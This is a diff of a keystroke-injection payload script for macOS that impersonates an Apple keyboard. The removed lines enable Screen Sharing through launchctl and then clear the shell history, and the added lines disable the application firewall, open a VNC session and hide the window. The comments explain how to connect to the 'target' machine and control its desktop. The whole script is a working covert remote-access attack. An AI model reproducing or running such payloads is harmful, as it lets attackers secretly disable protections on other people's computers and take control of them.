@@ -4,14 +4,21 @@ REM and control that Mac from another computer using a VNC viewer application.
 
 
 
-REM Creates a temporary directory called "phantom_vnc" in the "/tmp" directory and navigates into it.
-REM Creates a script file called "vnc_start.sh", 
-REM which contains the command to start the MacOS built-in VNC server
-REM creates another script "vnc_stop.sh" that contains a command to stop the VNC server. 
-REM It then changes the permissions of these files to be executable using the chmod command.
-REM Executes the "vnc_start.sh" script to start the VNC server.
-REM Finally, it clears the Terminal history and exits Terminal.
+REM This script disables the firewall, opens a VNC connection to localhost,
+REM and hides the Screen Sharing window.
+REM you can replace "localhost" with targets I.P. 
 
+
+REM Now you can use your local computer to tap into the target
+REM This command will install the RealVNC VNC Viewer 'brew install --cask realvnc-vnc-viewer'
+REM In RealVNC VNC Viewer, enter the IP address of the target machine 
+REM (the machine where you ran the script) and click the "Connect" button. 
+
+REM RealVNC VNC Viewer should establish a connection to the target machine, 
+REM you should be able to see and control the remote desktop of the target machine on your computer.
+
+REM Note that the specific command and package name may vary 
+REM based on the version of Homebrew and RealVNC available at the time of installation.
 
 
 REM Author: Narsty
@@ -21,28 +28,21 @@ REM Version: 1.0
 REM Category: Execution
 
 ID 05ac:021e Apple:Keyboard
-DELAY 500
+DELAY 1000
 GUI SPACE
 DELAY 500
-STRING Terminal
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
+ENTER
+DELAY 500
+STRING open vnc://localhost
 DELAY 500
 ENTER
 DELAY 500
-STRING mkdir /tmp/phantom_vnc && cd /tmp/phantom_vnc
-ENTER
+ENTER 
 DELAY 500
-STRING echo 'launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist' > vnc_start.sh
-ENTER
-DELAY 500
-STRING echo 'launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.plist' > vnc_stop.sh
-ENTER
-DELAY 500
-STRING chmod +x vnc_start.sh vnc_stop.sh
-ENTER
-DELAY 500
-STRING ./vnc_start.sh
-ENTER
-DELAY 500
-STRING history -c && exit
-ENTER
+GUI h
 
